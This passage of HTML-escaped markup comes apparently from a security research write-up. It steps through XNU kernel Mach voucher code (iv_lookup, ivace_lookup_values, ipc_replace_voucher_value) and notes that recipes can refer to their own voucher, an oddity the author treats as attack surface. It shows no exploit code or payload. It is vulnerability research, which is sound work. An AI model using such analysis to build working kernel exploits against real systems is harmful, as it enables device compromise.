 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.bb233177f78d9071ef9e7fd9994b192f8d1f87d3&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.18&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;inline&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_key_to_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;MACH_VOUCHER_ATTR_KEY_ALL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;||&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_UNUSED_KEYINDEX&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_index_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivgt_lookup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;then gets a reference on that key&amp;#39;s attr manager and attr controller. The manager is really just a bunch of function pointers which define the semantics of what different &amp;quot;key types&amp;quot; actually mean; and the controller stores (and caches) values for those keys.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s keep reading &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;. Here&amp;#39;s the next statement:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.ab9235fa2555d8200bd62bdf3838f3a821ead649&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.19&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* save the current value stored in the forming voucher */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; save_val_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_lookup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;This point is important for getting a good feeling for how the voucher code is supposed to work; recipes can refer not only to other vouchers (via the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;port) but they can also refer to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;themselves&lt;/span&gt;&lt;span&gt;&amp;nbsp;during creation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;You don&amp;#39;t have to have just one sub-recipe per attr type for which you wish to have a value in your voucher; you can specify multiple sub-recipes for that type. &lt;/span&gt;&lt;span&gt;Does it actually make any sense to do that? Well, luckily for the security researcher we don&amp;#39;t have to worry about whether functionality actually makes any sense; it&amp;#39;s all just a weird machine to us!&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;(There&amp;#39;s allusions in the code to future functionality where attribute values can be &amp;quot;layered&amp;quot; or &amp;quot;linked&amp;quot; but for now such functionality doesn&amp;#39;t exist.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_lookup&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns the &amp;quot;value index&amp;quot; for the given key in the particular voucher. That means it just returns the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_index_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;of the given voucher:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.18a23982f89054f9b506caa6cac52aa2dd16172b&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.20&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;inline&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_lookup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_index_t key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_UNUSED_VALINDEX&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;This value index uniquely identifies an existing attribute value, but you need to ask the attribute&amp;#39;s controller for the actual value. Before getting that previous value &lt;/span&gt;&lt;span&gt;though, the&lt;/span&gt;&lt;span&gt;&amp;nbsp;code first determines whether this sub-recipe might be trying to refer to the value currently stored by this voucher or has explicitly passed in a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;previous_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;. The value in the previous voucher takes precedence over whatever is already in the under-construction voucher.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.f5a4045ea337ae1a6d9765b8d290b9e3f343559c&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.21&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_val_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IV_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_lookup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;prev_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; save_val_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Then the code looks up the actual previous value to operate on:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3d5b30b0ca79263b24534436b9c17b9f568c14c6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.22&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_lookup_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_val_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;previous_vals_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;key_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the key we&amp;#39;re operating on, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;in this example. This function is called &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_lookup_values&lt;/span&gt;&lt;span&gt;&amp;nbsp;(note the plural). There are some comments in the voucher code indicating that maybe in the future values could themselves be put into a linked-list such that you could have larger values (or layered/chained values.) But this functionality isn&amp;#39;t implemented; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_lookup_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;will only ever return 1 value.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Here&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_lookup_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.8394840551adb03f1e3384056efc45160047f0ab&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.23&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_lookup_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_size_t &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_entry_t ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
